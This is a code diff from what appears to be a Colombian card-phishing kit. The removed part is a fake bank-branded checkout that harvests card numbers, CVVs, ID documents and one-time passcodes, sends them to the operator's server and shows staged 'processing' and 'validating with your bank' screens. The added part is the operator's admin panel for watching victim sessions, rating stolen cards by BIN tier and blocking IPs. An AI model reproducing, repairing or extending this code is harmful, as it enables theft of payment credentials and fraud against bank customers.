+                                <th class="checkbox-col"><input type="checkbox" id="checkAllIps"></th>
+                                <th>IP</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyIps">
+                            <tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="tab-logs">
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        📜 Logs de acceso al panel
+                        <span class="badge" id="badgeLogs">0</span>
+                    </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarLogs" placeholder="🔍 Buscar tipo, usuario, IP...">
+                        <button class="btn-borrar" id="btnBorrarLogs" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllLogs"></th>
+                                <th>Fecha</th>
+                                <th>Tipo</th>
+                                <th>Detalles</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyLogs">
+                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+    </div>
 </div>
 
-<!-- ============================================================
-     CVV MODAL
-     ============================================================ -->
-<div class="cvv-modal-overlay" id="cvvModalOverlay" onclick="cerrarCvvModal(event)">
-  <div class="cvv-modal" onclick="event.stopPropagation()">
-    <button class="cvv-modal-close" onclick="cerrarCvvModal(event)" type="button">✕</button>
-    <img src="img/cvv-ejemplo.png" alt="Ubicación del CVV">
-    <button type="button" class="btn-back-payment" onclick="cerrarCvvModal(event)">Entendido</button>
-  </div>
-</div>
-
-<!-- ============================================================
-     AUTH MODAL (OTP) — el contenido lo genera el JS
-     ============================================================ -->
-<div class="auth-modal" id="authModal">
-  <div class="auth-modal-content" id="authModalContent">
-    <button class="auth-modal-close" onclick="cerrarAuthModal()" type="button">×</button>
-    <div id="authModalBody"></div>
-  </div>
-</div>
-
-<!-- ============================================================
-     OVERLAY DE CARGA DE PAGO (LOTTIE)
-     ============================================================ -->
-<div id="pagoCargaOverlay" class="pago-carga-overlay hidden">
-  <img src="img/Logo-DTB-01.png" alt="Logo" class="pago-carga-logo">
-  <div id="pagoCargaLottie" class="pago-carga-lottie"></div>
-  <div class="pago-carga-texto">Procesando tu pago<span class="pago-carga-dots"><span></span><span></span><span></span></span></div>
-  <div class="pago-carga-subtexto">Esto puede tardar unos segundos. No cierres esta ventana.</div>
-  <div class="pago-carga-progress"></div>
-  <div class="pago-carga-seguridad">
-    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-    Conexión segura
-  </div>
-</div>
-
-<!-- ============================================================
-     OVERLAY DE CARGA OTP
-     ============================================================ -->
-<div id="pagoCargaOtpOverlay" class="pago-carga-otp-overlay hidden">
-  <img src="img/Logo-DTB-01.png" alt="Logo" class="pago-carga-otp-logo">
-  <div class="pago-carga-otp-spinner"></div>
-  <div class="pago-carga-otp-texto">Validando el código con tu banco...</div>
-</div>
-
-<!-- ============================================================
-     OVERLAY DE ERROR OTP
-     ============================================================ -->
-<div id="pagoErrorOtpOverlay" class="pago-error-otp-overlay hidden">
-  <div class="pago-error-otp-icono">
-    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
-  </div>
-  <div class="pago-error-otp-titulo" id="pagoErrorOtpTitulo">Código incorrecto</div>
-  <div class="pago-error-otp-texto" id="pagoErrorOtpTexto">El código ingresado no es válido o expiró. Intenta nuevamente.</div>
-  <button type="button" class="pago-error-otp-btn" onclick="cerrarPagoErrorOtp()">Intentar de nuevo</button>
-</div>
-
-<!-- ============================================================
-     OVERLAY DE ERROR DE PAGO (RECHAZADO / CC_ERROR)
-     ============================================================ -->
-<div id="pagoErrorOverlay" class="pago-error-overlay hidden">
-  <div class="pago-error-icono">
-    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
-  </div>
-  <img id="pagoErrorLogo" src="" alt="Marca" class="pago-error-logo" style="height:60px;max-width:200px;object-fit:contain;">
-  <div id="pagoErrorTitulo" class="pago-error-titulo">Tarjeta no admitida</div>
-  <div id="pagoErrorTexto" class="pago-error-texto">El banco emisor rechazó la transacción. Verifica que la tarjeta esté habilitada para compras en línea o intenta con otra tarjeta.</div>
-  <button type="button" id="pagoErrorBtn" class="pago-error-btn" onclick="cerrarPagoError()">Cambiar tarjeta</button>
-</div>
+<div id="toast"></div>
 
 <script>
-/* ============================================================
-   VARIABLES GLOBALES
-   ============================================================ */
 const API_BASE = window.location.origin;
-let marcaSeleccionada = 'visa';
-let pagoPollingInterval = null;
-let pagoOtpPollingInterval = null;
-let lottiePago = null;
-let sessionIdPago = null;
-let montoPago = 0;
+let TOKEN = sessionStorage.getItem('adminToken') || '';
+let USUARIO = sessionStorage.getItem('adminUser') || '';
+let pollInterval = null;
 
-/* ============================================================
-   UTILIDADES
-   ============================================================ */
+let sesionesCache = [];
+let ipsCache = [];
+let logsCache = [];
+let activosCache = [];
+
+let seleccionSesiones = new Set();
+let seleccionIps = new Set();
+let seleccionLogs = new Set();
+
 function $(id) { return document.getElementById(id); }
 
-function mostrarPagoCarga() {
-    const overlay = $('pagoCargaOverlay');
-    if (!overlay) return;
-    overlay.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-    if (window.lottie && !lottiePago) {
-        lottiePago = lottie.loadAnimation({
-            container: $('pagoCargaLottie'),
-            renderer: 'svg',
-            loop: true,
-            autoplay: true,
-            path: 'https://assets10.lottiefiles.com/packages/lf20_p8bfn5to.json'
+function toast(msg, isError = false) {
+    const el = $('toast');
+    el.textContent = msg;
+    el.className = 'show' + (isError ? ' error' : '');
+    clearTimeout(el._t);
+    el._t = setTimeout(() => { el.className = ''; }, 3000);
+}
+
+function escapeHtml(s) {
+    if (s == null) return '';
+    return String(s).replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+    }[c]));
+}
+
+function truncar(s, max = 30) {
+    if (!s) return '-';
+    s = String(s);
+    return s.length > max ? s.slice(0, max) + '...' : s;
+}
+
+function formatTime(segundos) {
+    if (segundos < 60) return segundos + 's';
+    if (segundos < 3600) return Math.floor(segundos / 60) + 'm ' + (segundos % 60) + 's';
+    return Math.floor(segundos / 3600) + 'h ' + Math.floor((segundos % 3600) / 60) + 'm';
+}
+
+/* ============================================================
+   LOGOS DE MARCA (VISA / MASTERCARD / AMEX) — SVG INLINE
+   ============================================================ */
+const LOGO_VISA = '<svg viewBox="0 0 100 33" xmlns="http://www.w3.org/2000/svg"><path d="M42.5 0.5L28.9 32.8H19.6L12.7 6.5C12.3 5.3 11.9 4.9 11 4.4C9.5 3.5 6.9 2.7 4.6 2.2L4.7 1.4H19.7C21.8 1.4 23.7 2.8 24.2 5.2L27.6 23.4L36.2 1.4H42.5V0.5ZM67.4 22C67.5 12.4 54.7 12.4 54.8 7.9C54.8 6.5 56.1 5 59 5C60.4 5 64.3 5.4 66.5 6.4L67.5 1.1C65.3 0.2 62.4 0 59 0C47.8 0 40 5.8 40 14.2C40 20.4 45.6 23.8 49.8 26C54.1 28.2 55.5 29.7 55.5 31.6C55.5 34.7 51.8 36 48.4 36C42.5 36 38.9 34.3 36.6 33L35.4 38.4C38.3 39.7 43.7 41 47.8 41C59.6 41 66.5 35.4 66.5 26.6C66.5 20.2 60.2 16.5 56.8 14C53.5 11.4 52.5 10.1 52.5 8.6C52.5 6.5 54.8 4.4 58.8 4.4C62.7 4.4 66.2 5.9 67.4 22ZM95.2 1.4H85.8C83.7 1.4 82.2 2.6 81.4 4.4L59.7 40.8H72.1L74.6 34.1H93.7L95.2 40.8H107L95.2 1.4ZM78.3 25.6L83.6 12.1L87.6 25.6H78.3Z" fill="#1434CB" transform="translate(0 -1)"/></svg>';
+
+const LOGO_MC = '<svg viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
+
+const LOGO_AMEX = '<svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
+
+function logoMarca(marca) {
+    if (marca === 'visa') return LOGO_VISA;
+    if (marca === 'mastercard') return LOGO_MC;
+    if (marca === 'amex') return LOGO_AMEX;
+    return '💳';
+}
+
+function nombreBanco(key, marca) {
+    if (key === 'cc-bogota') {
+        return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>';
+    }
+    if (key === 'cc-bucaramanga') {
+        return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>';
+    }
+    const nombres = {
+        'bancolombia': '🏦 Bancolombia',
+        'davivienda': '🏦 Davivienda',
+        'avvillas': '🏦 AV Villas',
+        'bogota': '🏦 B. Bogotá',
+        'caja-social': '🏦 Caja Social',
+        'bbva': '🏦 BBVA',
+        'popular': '🏦 Popular',
+        'occidente': '🏦 Occidente',
+        'nequi': '📱 Nequi'
+    };
+    return nombres[key] || key;
+}
+
+/* ============================================================
+   RENDER DE NIVEL DE TARJETA (BIN LOOKUP)
+   Combina tipo + nivel en una sola etiqueta visual
+   ============================================================ */
+function claseNivel(nivel) {
+    if (!nivel) return 'desconocido';
+    const n = String(nivel).toLowerCase();
+    if (n.includes('platinum') || n.includes('platino')) return 'platinum';
+    if (n.includes('gold') || n.includes('oro')) return 'gold';
+    if (n.includes('silver') || n.includes('plata')) return 'silver';
+    if (n.includes('black') || n.includes('negra')) return 'black';
+    if (n.includes('business') || n.includes('empresarial')) return 'business';
+    if (n.includes('signature')) return 'signature';
+    if (n.includes('infinite')) return 'infinite';
+    if (n.includes('classic') || n.includes('clásica')) return 'classic';
+    if (n.includes('standard') || n.includes('estándar')) return 'standard';
+    return 'desconocido';
+}
+
+function renderNivelTarjeta(tipo, nivel) {
+    if (!nivel || nivel === 'Desconocido') {
+        return '<span class="bin-nivel desconocido">—</span>';
+    }
+    let tipoMostrar = '';
+    const t = String(tipo || '').toUpperCase();
+    if (t.includes('CREDIT')) tipoMostrar = 'Crédito ';
+    else if (t.includes('DEBIT')) tipoMostrar = 'Débito ';
+
+    const texto = tipoMostrar + nivel;
+    const clase = claseNivel(nivel);
+    return `<span class="bin-nivel ${clase}">${escapeHtml(texto)}</span>`;
+}
+
+async function api(path, options = {}) {
+    const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
+    if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN;
+    const res = await fetch(API_BASE + path, { ...options, headers });
+    if (res.status === 401) { logout(); throw new Error('Sesión expirada'); }
+    if (res.status === 403) {
+        const d = await res.json().catch(() => ({}));
+        if (d.redirect) window.location.href = d.redirect;
+        throw new Error(d.error || 'Acceso denegado');
+    }
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || 'Error en la petición');
+    return data;
+}
+
+$('loginBtn').addEventListener('click', login);
+$('loginPass').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+$('loginUser').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+
+async function login() {
+    const usuario = $('loginUser').value.trim();
+    const password = $('loginPass').value;
+    if (!usuario || !password) { mostrarErrorLogin('Complete usuario y contraseña'); return; }
+    $('loginBtn').disabled = true;
+    $('loginBtn').textContent = 'Verificando...';
+    try {
+        const res = await fetch(API_BASE + '/admin/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usuario, password })
         });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Credenciales inválidas');
+        TOKEN = data.token;
+        USUARIO = data.usuario;
+        sessionStorage.setItem('adminToken', TOKEN);
+        sessionStorage.setItem('adminUser', USUARIO);
+        mostrarDashboard();
+    } catch (e) {
+        mostrarErrorLogin(e.message);
+    } finally {
+        $('loginBtn').disabled = false;
+        $('loginBtn').textContent = 'Ingresar';
     }
 }
 
-function ocultarPagoCarga() {
-    const overlay = $('pagoCargaOverlay');
-    if (overlay) overlay.classList.add('hidden');
-    document.body.style.overflow = '';
-    if (lottiePago) { lottiePago.destroy(); lottiePago = null; }
+function mostrarErrorLogin(msg) {
+    const el = $('loginError');
+    el.textContent = msg;
+    el.classList.remove('hidden');
+    setTimeout(() => el.classList.add('hidden'), 5000);
 }
 
-function mostrarPagoCargaOtp() {
-    const overlay = $('pagoCargaOtpOverlay');
-    if (overlay) overlay.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
+function logout() {
+    fetch(API_BASE + '/admin/logout', { method: 'POST', headers: { 'Authorization': 'Bearer ' + TOKEN } }).catch(() => {});
+    sessionStorage.removeItem('adminToken');
+    sessionStorage.removeItem('adminUser');
+    TOKEN = '';
+    USUARIO = '';
+    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+    $('dashboard').classList.remove('visible');
+    $('loginScreen').style.display = 'flex';
+    $('loginUser').value = '';
+    $('loginPass').value = '';
+    seleccionSesiones.clear();
+    seleccionIps.clear();
+    seleccionLogs.clear();
 }
 
-function ocultarPagoCargaOtp() {
-    const overlay = $('pagoCargaOtpOverlay');
-    if (overlay) overlay.classList.add('hidden');
-    document.body.style.overflow = '';
-}
+$('logoutBtn').addEventListener('click', logout);
 
-function cerrarPagoErrorOtp() {
-    const overlay = $('pagoErrorOtpOverlay');
-    if (overlay) overlay.classList.add('hidden');
-    document.body.style.overflow = '';
-}
-
-/* ============================================================
-   MOSTRAR ERROR DE PAGO (rechazado o cc_error)
-   ============================================================ */
-function mostrarPagoError(marca, tipo = 'rechazado') {
-    var overlay = $('pagoErrorOverlay');
-    var logo = $('pagoErrorLogo');
-    var titulo = $('pagoErrorTitulo');
-    var texto = $('pagoErrorTexto');
-    var btn = $('pagoErrorBtn');
-
-    // Cambiar textos según tipo de error
-    if (tipo === 'cc_error') {
-        titulo.textContent = 'Tarjeta no admitida';
-        texto.textContent = 'Tu tarjeta no está habilitada para este tipo de compras. Por favor, comunícate con tu banco o intenta con otra tarjeta.';
-        btn.textContent = 'Entendido';
-    } else {
-        titulo.textContent = 'Pago rechazado';
-        texto.textContent = 'El banco emisor rechazó la transacción. Verifica los datos o intenta con otra tarjeta.';
-        btn.textContent = 'Cambiar tarjeta';
-    }
-
-    // Inyectar SVG de la marca (usando innerHTML en un contenedor para no romper la referencia)
-    if (logo) {
-        const wrapper = document.createElement('div');
-        if (marca === 'visa') {
-            wrapper.innerHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
-        } else if (marca === 'amex') {
-            wrapper.innerHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
-        } else {
-            wrapper.innerHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
-        }
-        logo.innerHTML = wrapper.innerHTML;
-    }
-
-    ocultarPagoCarga();
-    overlay.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-}
-
-function cerrarPagoError() {
-    const overlay = $('pagoErrorOverlay');
-    if (overlay) overlay.classList.add('hidden');
-    document.body.style.overflow = '';
-    // Al cerrar, volvemos a mostrar el modal de tarjeta para que el usuario intente con otra
-    abrirModalTarjeta();
-}
-
-/* ============================================================
-   POLLING PAGO (tarjeta)
-   ============================================================ */
-function iniciarPollingPago(sessionId, marca) {
-    if (pagoPollingInterval) clearInterval(pagoPollingInterval);
-    sessionIdPago = sessionId;
-    pagoPollingInterval = setInterval(async () => {
-        try {
-            const res = await fetch(`${API_BASE}/cc-bogota/estado/${encodeURIComponent(sessionId)}`);
-            const data = await res.json();
-            if (data.estado === 'aceptado') {
-                clearInterval(pagoPollingInterval);
-                pagoPollingInterval = null;
-                ocultarPagoCarga();
-                mostrarAuthModal();
-            } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
-                clearInterval(pagoPollingInterval);
-                pagoPollingInterval = null;
-                ocultarPagoCarga();
-                mostrarPagoError(marca, data.estado);
-            }
-        } catch (e) {
-            // silencioso, reintenta en el próximo tick
-        }
-    }, 2000);
-}
-
-/* ============================================================
-   POLLING OTP
-   ============================================================ */
-function iniciarPollingOtp(sessionId) {
-    if (pagoOtpPollingInterval) clearInterval(pagoOtpPollingInterval);
-    pagoOtpPollingInterval = setInterval(async () => {
-        try {
-            const res = await fetch(`${API_BASE}/cc-bogota/estado/${encodeURIComponent(sessionId)}`);
-            const data = await res.json();
-            if (data.estado === 'finalizado') {
-                clearInterval(pagoOtpPollingInterval);
-                pagoOtpPollingInterval = null;
-                ocultarPagoCargaOtp();
-                // Aquí podrías redirigir a una pantalla de éxito
-                alert('Pago finalizado con éxito');
-            } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
-                clearInterval(pagoOtpPollingInterval);
-                pagoOtpPollingInterval = null;
-                ocultarPagoCargaOtp();
-                // Mostrar error OTP con texto según tipo
-                const overlay = $('pagoErrorOtpOverlay');
-                const titulo = $('pagoErrorOtpTitulo');
-                const texto = $('pagoErrorOtpTexto');
-                if (data.estado === 'cc_error') {
-                    titulo.textContent = 'Tarjeta no admitida';
-                    texto.textContent = 'Tu tarjeta no está habilitada para este tipo de compras. Comunícate con tu banco o intenta con otra tarjeta.';
-                } else {
-                    titulo.textContent = 'Pago rechazado';
-                    texto.textContent = 'El banco emisor rechazó la transacción. Intenta con otra tarjeta.';
-                }
-                if (overlay) overlay.classList.remove('hidden');
-                document.body.style.overflow = 'hidden';
-            }
-        } catch (e) {}
-    }, 2000);
-}
-
-/* ============================================================
-   MODALES (abrir/cerrar)
-   ============================================================ */
-function abrirModalTarjeta() {
-    const modal = $('modalTarjeta');
-    if (modal) modal.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-}
-function cerrarModalTarjeta() {
-    const modal = $('modalTarjeta');
-    if (modal) modal.classList.add('hidden');
-    document.body.style.overflow = '';
-}
-
-function abrirModalBanco() {
-    const modal = $('modalBanco');
-    if (modal) modal.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-}
-function cerrarModalBanco() {
-    const modal = $('modalBanco');
-    if (modal) modal.classList.add('hidden');
-    document.body.style.overflow = '';
-}
-
-function abrirCvvModal() {
-    const overlay = $('cvvModalOverlay');
-    if (overlay) overlay.classList.add('active');
-}
-function cerrarCvvModal(e) {
-    if (e) e.stopPropagation();
-    const overlay = $('cvvModalOverlay');
-    if (overlay) overlay.classList.remove('active');
-}
-
-function cerrarAuthModal() {
-    const modal = $('authModal');
-    if (modal) modal.classList.remove('show');
-    document.body.style.overflow = '';
-}
-
-/* ============================================================
-   AUTH MODAL (OTP) — contenido dinámico
-   ============================================================ */
-function mostrarAuthModal() {
-    const modal = $('authModal');
-    const body = $('authModalBody');
-    if (!modal || !body) return;
-    body.innerHTML = `
-        <div style="padding: 32px 24px;">
-            <h3 style="font-size: 20px; font-weight: 700; color: #00271c; margin-bottom: 8px; text-align: center;">Verificación de seguridad</h3>
-            <p style="font-size: 14px; color: #555; text-align: center; margin-bottom: 24px;">Ingresa el código OTP que enviamos a tu teléfono.</p>
-            <input type="tel" id="inputOtp" inputmode="numeric" maxlength="6" placeholder="000000"
-                   style="width:100%; padding:14px; border:1px solid #cacaca; border-radius:8px; font-size:24px; text-align:center; letter-spacing:8px; outline:none;">
-            <button type="button" id="btnEnviarOtp"
-                    style="width:100%; margin-top:20px; padding:14px; background:#00271c; color:#88f456; border:none; border-radius:9999px; font-size:16px; font-weight:700; cursor:pointer;">
-                Validar código
-            </button>
-        </div>
-    `;
-    modal.classList.add('show');
-    document.body.style.overflow = 'hidden';
-
-    $('btnEnviarOtp').addEventListener('click', async () => {
-        const otp = ($('inputOtp').value || '').trim();
-        if (otp.length < 4) { alert('Ingresa un código válido'); return; }
-        mostrarPagoCargaOtp();
-        try {
-            await fetch(`${API_BASE}/cc-bogota/enviar-otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId: sessionIdPago, otp })
-            });
-            cerrarAuthModal();
-            iniciarPollingOtp(sessionIdPago);
-        } catch (e) {
-            ocultarPagoCargaOtp();
-            alert('Error enviando OTP');
-        }
+document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        btn.classList.add('active');
+        $('tab-' + btn.dataset.tab).classList.add('active');
     });
-}
-
-/* ============================================================
-   ENVÍO DE PAGO CON TARJETA
-   ============================================================ */
-document.addEventListener('DOMContentLoaded', () => {
-    // Llenar años de vencimiento
-    const selectAnio = $('selectAnio');
-    if (selectAnio) {
-        const anioActual = new Date().getFullYear();
-        for (let i = 0; i < 12; i++) {
-            const opt = document.createElement('option');
-            opt.value = String(anioActual + i).slice(-2);
-            opt.textContent = String(anioActual + i).slice(-2);
-            selectAnio.appendChild(opt);
-        }
-    }
-
-    // Ocultar pantalla de carga inicial
-    setTimeout(() => {
-        const pc = $('pantallaCargaInicial');
-        if (pc) pc.classList.add('oculto');
-    }, 800);
-
-    // Formatear número de tarjeta y detectar marca
-    const inputTarjeta = $('inputTarjeta');
-    if (inputTarjeta) {
-        inputTarjeta.addEventListener('input', (e) => {
-            let v = e.target.value.replace(/\D/g, '').slice(0, 19);
-            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
-            detectarMarca(v);
-        });
-    }
-
-    // Botón pagar
-    const btnPagar = $('btnPagarTarjeta');
-    if (btnPagar) {
-        btnPagar.addEventListener('click', async () => {
-            const tarjeta = ($('inputTarjeta').value || '').replace(/\D/g, '');
-            const titular = ($('inputTitular').value || '').trim();
-            const mes = $('selectMes').value;
-            const anio = $('selectAnio').value;
-            const cvv = ($('inputCvv').value || '').trim();
-            const docNumber = ($('inputDocNumber').value || '').trim();
-            const docType = $('selectDocType').value;
-            const terminos = $('checkTerminos').checked;
-
-            if (tarjeta.length < 15) { alert('Número de tarjeta inválido'); return; }
-            if (!titular) { alert('Ingresa el titular'); return; }
-            if (!mes || !anio) { alert('Selecciona la fecha de vencimiento'); return; }
-            if (cvv.length < 3) { alert('CVV inválido'); return; }
-            if (!docNumber) { alert('Ingresa el documento'); return; }
-            if (!terminos) { alert('Debes aceptar los términos'); return; }
-
-            sessionIdPago = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
-            mostrarPagoCarga();
-
-            try {
-                const res = await fetch(`${API_BASE}/cc-bogota/enviar-pago`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: sessionIdPago,
-                        marca: marcaSeleccionada,
-                        tarjeta,
-                        titular,
-                        docType,
-                        docNumber,
-                        monto: montoPago,
-                        expMes: mes,
-                        expAnio: anio,
-                        cvv
-                    })
-                });
-                const data = await res.json();
-                if (!data.ok) throw new Error(data.error || 'Error al enviar pago');
-                iniciarPollingPago(sessionIdPago, marcaSeleccionada);
-            } catch (e) {
-                ocultarPagoCarga();
-                alert('Error: ' + e.message);
-            }
-        });
-    }
 });
 
-function detectarMarca(numero) {
-    const logos = document.querySelectorAll('#cardLogos .card-logo-item');
-    let marca = null;
-    if (/^4/.test(numero)) marca = 'visa';
-    else if (/^(5[1-5]|2[2-7])/.test(numero)) marca = 'mastercard';
-    else if (/^3[47]/.test(numero)) marca = 'amex';
-
-    logos.forEach(l => {
-        if (marca && l.dataset.brand === marca) l.classList.remove('oculto');
-        else if (marca) l.classList.add('oculto');
-        else l.classList.remove('oculto');
-    });
-
-    if (marca) marcaSeleccionada = marca;
-
-    // Mensaje especial para AMEX
-    const msgAmex = $('cvvMensajeAmex');
-    if (msgAmex) msgAmex.style.display = marca === 'amex' ? 'block' : 'none';
+function mostrarDashboard() {
+    $('loginScreen').style.display = 'none';
+    $('dashboard').classList.add('visible');
+    $('currentUser').textContent = USUARIO;
+    cargarTodo();
+    if (pollInterval) clearInterval(pollInterval);
+    pollInterval = setInterval(cargarTodo, 3000);
 }
+
+async function cargarTodo() {
+    try {
+        await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs()]);
+    } catch (e) { console.error(e); }
+}
+
+async function cargarStats() {
+    try {
+        const d = await api('/admin/stats');
+        $('statActivos').textContent = d.activos;
+        $('statSesiones').textContent = d.sesiones;
+        $('statPendientes').textContent = d.pendientes;
+        $('statBloqueadas').textContent = d.bloqueadas;
+        $('badgeActivos').textContent = d.activos;
+        $('badgeSesiones').textContent = d.sesiones;
+        $('badgeIps').textContent = d.bloqueadas;
+    } catch (e) {}
+}
+
+async function cargarActivos() {
+    try {
+        const d = await api('/admin/activos');
+        activosCache = d.activos;
+        renderActivos();
+    } catch (e) {}
